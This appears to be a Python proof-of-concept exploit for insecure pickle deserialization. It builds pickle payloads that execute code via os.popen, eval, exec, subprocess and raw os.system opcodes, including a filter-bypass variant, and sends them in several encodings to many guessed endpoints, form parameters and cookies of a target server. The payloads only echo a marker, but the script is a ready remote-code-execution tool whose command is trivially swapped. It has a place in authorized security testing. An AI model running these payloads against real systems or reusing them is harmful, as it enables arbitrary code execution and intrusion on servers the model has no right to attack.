#!/usr/bin/env python3
"""
PoC: Insecure Deserialization (Pickle) - CVE-GENERIC-DESER-001

Vulnerability: Insecure deserialization of untrusted data via Python's pickle
module. When a server deserializes user-supplied pickle data without validation,
an attacker can craft malicious pickle payloads that execute arbitrary code
during deserialization.

This script crafts pickle payloads that produce a unique marker string as a
side effect, sends them to common deserialization endpoints, and checks the
response for evidence of successful execution.

Usage (authorized testing only):
    python poc_insecure_deser_001.py --target http://localhost:8080 --timeout 10

Exit codes:
    0 - CONFIRMED: vulnerability reproduced
    1 - NOT_REPRODUCED: target does not appear vulnerable
    2 - ERROR: script encountered an error during execution

IMPORTANT: Only use against systems you have explicit written authorization
to test. Unauthorized access to computer systems is illegal.
"""

import argparse
import base64
import hashlib
import os
import pickle
import struct
import sys
import time

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("[ERROR] DESER-001: 'requests' library is required. Install with: pip install requests")
    sys.exit(2)

VULN_ID = "DESER-001"


def generate_marker():
    """Generate a unique marker for this deserialization test run."""
    raw = f"deser-{os.getpid()}-{time.time()}-{os.urandom(8).hex()}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16]


class PickleRCE_Echo(object):
    """Pickle payload that executes 'echo MARKER' and returns the output."""

    def __init__(self, marker):
        self.marker = marker

    def __reduce__(self):
        import os
        return (os.popen, (f"echo {self.marker}",))


class PickleRCE_Eval(object):
    """Pickle payload that uses eval to produce the marker string."""

    def __init__(self, marker):
        self.marker = marker

    def __reduce__(self):
        return (eval, (f"'{self.marker}'",))


class PickleRCE_Exec(object):
    """Pickle payload using exec to set a global variable."""

    def __init__(self, marker):
        self.marker = marker

    def __reduce__(self):
        code = f"import sys; sys.stdout.write('{self.marker}')"
        return (exec, (code,))


class PickleRCE_Subprocess(object):
    """Pickle payload using subprocess to echo the marker."""

    def __init__(self, marker):
        self.marker = marker

    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (["/bin/echo", self.marker],))


def build_raw_pickle_payload(marker):
    """
    Build a raw pickle payload using opcodes directly.
    This can bypass some simple pickle content filters.
    """
    # Pickle protocol 2 payload equivalent to:
    # os.system("echo MARKER")
    # Using raw opcodes: cos\nsystem\n(S'echo MARKER'\ntR.
    payload = (
        b"cos\nsystem\n"
        b"(S'echo " + marker.encode() + b"'\n"
        b"tR."
    )
    return payload


def build_payloads(marker):
    """Build all deserialization payloads in multiple formats."""
    payloads = []

    # Standard pickle payloads at different protocol versions
    pickle_classes = [
        ("echo_rce", PickleRCE_Echo),
        ("eval_rce", PickleRCE_Eval),
        ("exec_rce", PickleRCE_Exec),
        ("subprocess_rce", PickleRCE_Subprocess),
    ]

    for name, cls in pickle_classes:
        obj = cls(marker)
        for protocol in range(0, min(pickle.HIGHEST_PROTOCOL + 1, 6)):
            try:
                pickled = pickle.dumps(obj, protocol=protocol)

                # Raw bytes
                payloads.append({
                    "name": f"{name}_proto{protocol}_raw",
                    "description": f"{name} (protocol {protocol}, raw bytes)",
                    "data": pickled,
                    "content_type": "application/octet-stream",
                    "encoding": "raw",
                })

                # Base64 encoded
                b64_data = base64.b64encode(pickled).decode()
                payloads.append({
                    "name": f"{name}_proto{protocol}_b64",
                    "description": f"{name} (protocol {protocol}, base64)",
                    "data": b64_data.encode(),
                    "content_type": "text/plain",
                    "encoding": "base64",
                })

                # Hex encoded
                hex_data = pickled.hex()
                payloads.append({
                    "name": f"{name}_proto{protocol}_hex",
                    "description": f"{name} (protocol {protocol}, hex)",
                    "data": hex_data.encode(),
                    "content_type": "text/plain",
                    "encoding": "hex",
                })

            except Exception:
                continue

    # Raw opcode payload
    raw_payload = build_raw_pickle_payload(marker)
    payloads.append({
        "name": "raw_opcode_payload",
        "description": "Raw pickle opcodes (filter bypass attempt)",
        "data": raw_payload,
        "content_type": "application/octet-stream",
        "encoding": "raw",
    })
    payloads.append({
        "name": "raw_opcode_b64",
        "description": "Raw pickle opcodes (base64)",
        "data": base64.b64encode(raw_payload),
        "content_type": "text/plain",
        "encoding": "base64",
    })

    return payloads


# Endpoints commonly vulnerable to deserialization
DESER_ENDPOINTS = [
    ("POST", "/"),
    ("POST", "/api/load"),
    ("POST", "/api/import"),
    ("POST", "/api/deserialize"),
    ("POST", "/api/data"),
    ("POST", "/api/restore"),
    ("POST", "/api/session"),
    ("POST", "/api/cache"),
    ("POST", "/api/pickle"),
    ("POST", "/api/object"),
    ("POST", "/upload"),
    ("POST", "/import"),
    ("POST", "/load"),
    ("POST", "/restore"),
    ("PUT", "/api/data"),
    ("PUT", "/api/session"),
    ("PUT", "/api/cache"),
]

# Parameter names for query/form-based deserialization
DESER_PARAM_NAMES = [
    "data", "payload", "object", "session", "state",
    "cache", "pickle", "serialized", "blob", "input",
    "token", "cookie", "value",
]


def send_body_payload(session, target, method, endpoint, payload, timeout):
    """Send a deserialization payload as the request body."""
    url = target.rstrip("/") + endpoint

    try:
        headers = {"Content-Type": payload["content_type"]}

        if method == "POST":
            response = session.post(
                url,
                data=payload["data"],
                headers=headers,
                timeout=timeout,
                allow_redirects=False,
            )
        elif method == "PUT":
            response = session.put(
                url,
                data=payload["data"],
                headers=headers,
                timeout=timeout,
                allow_redirects=False,
            )
        else:
            return None

        return response

    except RequestException:
        return None


def send_param_payload(session, target, endpoint, param_name, payload, timeout):
    """Send a base64/hex deserialization payload as a form parameter."""
    url = target.rstrip("/") + endpoint

    if payload["encoding"] not in ("base64", "hex"):
        return None

    try:
        # As form data
        response = session.post(
            url,
            data={param_name: payload["data"]},
            timeout=timeout,
            allow_redirects=False,
        )
        return response
    except RequestException:
        return None


def check_response_for_marker(response, marker):
    """Check if the response shows evidence of successful deserialization."""
    if response is None:
        return False, []

    indicators = []

    # Direct marker in response body
    if marker in response.text:
        indicators.append("marker_in_body")

    # Check headers for marker (some frameworks leak eval results)
    for header_name, header_value in response.headers.items():
        if marker in str(header_value):
            indicators.append(f"marker_in_header_{header_name}")

    return len(indicators) > 0, indicators


def check_error_indicators(response):
    """Check for partial indicators in error responses that suggest pickle processing."""
    if response is None:
        return []

    indicators = []
    error_keywords = [
        "unpickle", "pickle", "deserialization", "UnpicklingError",
        "loads()", "pickle.loads", "marshal", "shelve",
        "_pickle", "cPickle", "cloudpickle", "dill",
        "ModuleNotFoundError", "AttributeError",
        "restricted", "not allowed", "blocked class",
    ]

    response_lower = response.text.lower()
    for kw in error_keywords:
        if kw.lower() in response_lower:
            indicators.append(kw)

    return indicators


def run_exploit(target, timeout):
    """
    Execute the insecure deserialization PoC against the target.

    Returns:
        tuple: (exit_code, results_dict)
    """
    marker = generate_marker()

    results = {
        "vuln_id": VULN_ID,
        "target": target,
        "marker": marker,
        "status": "NOT_REPRODUCED",
        "confirmed_vectors": [],
        "partial_indicators": [],
        "total_requests": 0,
        "errors": [],
    }

    session = requests.Session()
    session.headers.update({
        "User-Agent": "VulnAnalysis-PoC/1.0 (Authorized Security Testing)",
    })

    # Verify target is reachable
    try:
        probe = session.get(target, timeout=timeout)
        print(f"[*] {VULN_ID}: Target reachable (HTTP {probe.status_code})")
    except RequestException as e:
        results["status"] = "ERROR"
        results["errors"].append(f"Target unreachable: {e}")
        return 2, results

    print(f"[*] {VULN_ID}: Unique marker for this run: {marker}")

    payloads = build_payloads(marker)
    print(f"[*] {VULN_ID}: Built {len(payloads)} deserialization payloads")

    confirmed = False
    all_error_indicators = set()

    # Phase 1: Send payloads as request bodies
    print(f"[*] {VULN_ID}: Phase 1 - Testing body-based deserialization...")
    for method, endpoint in DESER_ENDPOINTS:
        if confirmed:
            break
        for payload in payloads:
            results["total_requests"] += 1
            response = send_body_payload(session, target, method, endpoint, payload, timeout)

            found, indicators = check_response_for_marker(response, marker)
            if found:
                results["confirmed_vectors"].append({
                    "method": method,
                    "endpoint": endpoint,
                    "payload_name": payload["name"],
                    "payload_description": payload["description"],
                    "delivery": "body",
                    "indicators": indicators,
                    "status_code": response.status_code if response else None,
                })
                if not confirmed:
                    print(f"[+] {VULN_ID}: Insecure deserialization CONFIRMED!")
                    print(f"    Endpoint: {method} {endpoint}")
                    print(f"    Payload: {payload['description']}")
                    print(f"    Indicators: {', '.join(indicators)}")
                    confirmed = True
                    break

            # Check for partial error indicators
            if response is not None:
                error_inds = check_error_indicators(response)
                for ei in error_inds:
                    all_error_indicators.add(ei)

    # Phase 2: Send payloads as form parameters (only if not already confirmed)
    if not confirmed:
        print(f"[*] {VULN_ID}: Phase 2 - Testing parameter-based deserialization...")
        for endpoint in [ep for _, ep in DESER_ENDPOINTS if "api" in ep]:
            if confirmed:
                break
            for param_name in DESER_PARAM_NAMES:
                if confirmed:
                    break
                for payload in payloads:
                    if payload["encoding"] not in ("base64", "hex"):
                        continue
                    results["total_requests"] += 1
                    response = send_param_payload(
                        session, target, endpoint, param_name, payload, timeout,
                    )

                    found, indicators = check_response_for_marker(response, marker)
                    if found:
                        results["confirmed_vectors"].append({
                            "method": "POST",
                            "endpoint": endpoint,
                            "param": param_name,
                            "payload_name": payload["name"],
                            "payload_description": payload["description"],
                            "delivery": "parameter",
                            "indicators": indicators,
                            "status_code": response.status_code if response else None,
                        })
                        if not confirmed:
                            print(f"[+] {VULN_ID}: Insecure deserialization CONFIRMED!")
                            print(f"    Endpoint: POST {endpoint} (param: {param_name})")
                            print(f"    Payload: {payload['description']}")
                            print(f"    Indicators: {', '.join(indicators)}")
                            confirmed = True
                            break

                    if response is not None:
                        error_inds = check_error_indicators(response)
                        for ei in error_inds:
                            all_error_indicators.add(ei)

    # Phase 3: Check for deserialization in cookies/headers
    if not confirmed:
        print(f"[*] {VULN_ID}: Phase 3 - Testing cookie/header-based deserialization...")
        for payload in payloads:
            if payload["encoding"] != "base64":
                continue
            results["total_requests"] += 1
            try:
                cookie_data = payload["data"] if isinstance(payload["data"], str) else payload["data"].decode()
                resp = session.get(
                    target,
                    cookies={"session": cookie_data, "data": cookie_data},
                    timeout=timeout,
                    allow_redirects=False,
                )
                found, indicators = check_response_for_marker(resp, marker)
                if found:
                    results["confirmed_vectors"].append({
                        "method": "GET (cookie)",
                        "endpoint": "/",
                        "payload_name": payload["name"],
                        "payload_description": payload["description"],
                        "delivery": "cookie",
                        "indicators": indicators,
                        "status_code": resp.status_code,
                    })
                    print(f"[+] {VULN_ID}: Insecure deserialization CONFIRMED via cookie!")
                    print(f"    Payload: {payload['description']}")
                    confirmed = True
                    break

                error_inds = check_error_indicators(resp)
                for ei in error_inds:
                    all_error_indicators.add(ei)

            except RequestException:
                pass

    if results["confirmed_vectors"]:
        results["status"] = "CONFIRMED"
        return 0, results

    if all_error_indicators:
        results["status"] = "PARTIAL"
        results["partial_indicators"].append({
            "type": "deserialization_error_keywords",
            "detail": f"Pickle/deserialization keywords found in error responses: {', '.join(sorted(all_error_indicators))}",
            "keywords": sorted(all_error_indicators),
        })
        return 1, results

    print(f"[-] {VULN_ID}: No deserialization indicators found after {results['total_requests']} requests")
    return 1, results


def main():
    parser = argparse.ArgumentParser(
        description=f"PoC for Insecure Deserialization vulnerability ({VULN_ID})",
        epilog="For authorized security testing only.",
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8080",
        help="Target base URL (default: http://localhost:8080)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=30,
        help="Request timeout in seconds (default: 30)",
    )
    args = parser.parse_args()

    target = args.target.rstrip("/")
    if not target.startswith(("http://", "https://")):
        print(f"[ERROR] {VULN_ID}: Target must start with http:// or https://")
        sys.exit(2)

    print(f"[*] {VULN_ID}: Insecure Deserialization PoC")
    print(f"[*] {VULN_ID}: Target: {target}")
    print(f"[*] {VULN_ID}: Timeout: {args.timeout}s")
    print(f"[*] {'=' * 60}")

    try:
        exit_code, results = run_exploit(target, args.timeout)
    except KeyboardInterrupt:
        print(f"\n[!] {VULN_ID}: Interrupted by user")
        sys.exit(2)
    except Exception as e:
        print(f"[ERROR] {VULN_ID}: Unhandled exception: {e}")
        sys.exit(2)

    print(f"[*] {'=' * 60}")
    status = results["status"]
    if status == "CONFIRMED":
        print(f"[CONFIRMED] {VULN_ID}: Insecure deserialization vulnerability confirmed")
        print(f"    Confirmed vectors: {len(results['confirmed_vectors'])}")
        for vec in results["confirmed_vectors"]:
            print(f"      - {vec['delivery']}: {vec['payload_description']} at {vec.get('endpoint', 'N/A')}")
    elif status == "PARTIAL":
        print(f"[PARTIAL] {VULN_ID}: Partial deserialization indicators found, manual review needed")
        for ind in results["partial_indicators"]:
            print(f"    {ind['detail']}")
    elif status == "ERROR":
        print(f"[ERROR] {VULN_ID}: {'; '.join(results['errors'])}")
    else:
        print(f"[NOT_REPRODUCED] {VULN_ID}: Insecure deserialization not reproduced")

    sys.exit(exit_code)


if __name__ == "__main__":
    main()
